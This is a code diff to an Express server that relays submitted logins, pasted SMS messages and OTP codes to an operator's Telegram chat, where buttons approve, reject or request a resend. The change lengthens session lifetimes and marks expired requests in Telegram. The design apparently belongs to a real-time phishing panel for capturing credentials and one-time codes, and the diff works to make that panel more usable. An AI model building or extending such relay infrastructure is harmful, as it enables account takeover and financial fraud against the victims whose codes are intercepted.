@@ -11,8 +11,9 @@
        * reject   → 'rejected'
        * resend   → 'resend'
        * reminder → 'reminder'
-   - Preserves original message body when editing on resolve
-   - SMS message wrapped in <pre><code> for Telegram copy button
+   - Sessions kept in-memory with 60-minute TTL
+   - Expired sessions: Telegram message edited to "⌛ EXPIRED"
+   - SMS body wrapped in <pre><code> for Telegram copy button
    - No DB (in-memory Map, auto-cleaned)
    ============================================================ */
 
@@ -35,8 +36,9 @@ const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}
 const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
 const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
 
-const SESSION_TIMEOUT_MS = 10 * 60 * 1000;
-const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
+/* ✅ Extended TTL: 60 minutes for pending, 120 minutes for max age */
+const SESSION_TIMEOUT_MS = 60 * 60 * 1000;   /* 60 min — pending → timeout */
+const SESSION_MAX_AGE_MS = 120 * 60 * 1000;  /* 120 min — hard delete */
 
 /* ============================================================
    IN-MEMORY SESSION STORE
@@ -228,6 +230,32 @@ async function answerCallback(callbackQueryId, text) {
   }
 }
 
+/* ✅ NEW: Handle a session that no longer exists */
+async function handleExpiredSession(cb, sessionId) {
+  await answerCallback(cb.id, '⌛ This request has expired');
+
+  /* Edit the Telegram message so admin sees it's dead */
+  try {
+    const messageId = cb.message?.message_id;
+    const chatId = cb.message?.chat?.id;
+
+    if (messageId && chatId) {
+      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+      const expiredText =
+        `⌛ <b>EXPIRED — NO ACTION NEEDED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `This request is too old to process.\n` +
+        `Session: <code>${escapeHtml(sessionId || 'unknown')}</code>\n\n` +
+        `🕒 <b>Marked at:</b> ${when}`;
+
+      await editTelegramMessage(messageId, expiredText, { inline_keyboard: [] });
+      console.log(`[expired] message ${messageId} marked as EXPIRED`);
+    }
+  } catch (err) {
+    console.error('expired edit failed:', err.message);
+  }
+}
+
 /* ============================================================
    HEALTH CHECK
    ============================================================ */
@@ -238,6 +266,7 @@ app.get('/', (_req, res) => {
     activeSessions: sessions.size,
     webhook: global.__webhookStatus || 'unknown',
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+    sessionTTLMinutes: SESSION_TIMEOUT_MS / 60000,
     time: new Date().toISOString()
   });
 });
@@ -296,8 +325,6 @@ app.post('/api/login', async (req, res) => {
 
 /* ============================================================
    POST /api/sms
-   — SMS body wrapped in <pre><code> so Telegram shows
-     a copy button on tap (long-press still works too)
    ============================================================ */
 app.post('/api/sms', async (req, res) => {
   try {
@@ -317,7 +344,6 @@ app.post('/api/sms', async (req, res) => {
     const sessionId = makeSessionId();
     const reference = makeReference('SMS');
 
-    /* ✅ <pre><code> — monospace block + Telegram copy button on tap */
     const text =
       `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
@@ -354,7 +380,6 @@ app.post('/api/sms', async (req, res) => {
 
 /* ============================================================
    POST /api/verify-otp
-   — Linked SMS also wrapped in <pre><code>
    ============================================================ */
 app.post('/api/verify-otp', async (req, res) => {
   try {
@@ -374,7 +399,6 @@ app.post('/api/verify-otp', async (req, res) => {
     const sessionId = makeSessionId();
     const reference = makeReference('OTP');
 
-    /* ✅ <pre><code> for the linked SMS — copy button on tap */
     const text =
       `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
@@ -483,8 +507,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     console.log(`[webhook] action=${action} step=${step} sessionId=${sessionId} found=${!!session}`);
 
+    /* ✅ FIXED: If session not found → mark message as EXPIRED */
     if (!session) {
-      await answerCallback(cb.id, 'Session expired');
+      await handleExpiredSession(cb, sessionId);
       return res.json({ ok: true });
     }
 
@@ -663,6 +688,8 @@ app.listen(PORT, async () => {
   console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
   console.log(`🤖 Bot token: ${TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.slice(0, 15) + '…' : 'MISSING'}`);
   console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID || 'MISSING'}`);
+  console.log(`⏱️  Session TTL: ${SESSION_TIMEOUT_MS / 60000} min (pending → timeout)`);
+  console.log(`🗑️  Max age:     ${SESSION_MAX_AGE_MS / 60000} min (hard delete)`);
   console.log('====================================');
 
   setTimeout(registerWebhook, 2000);
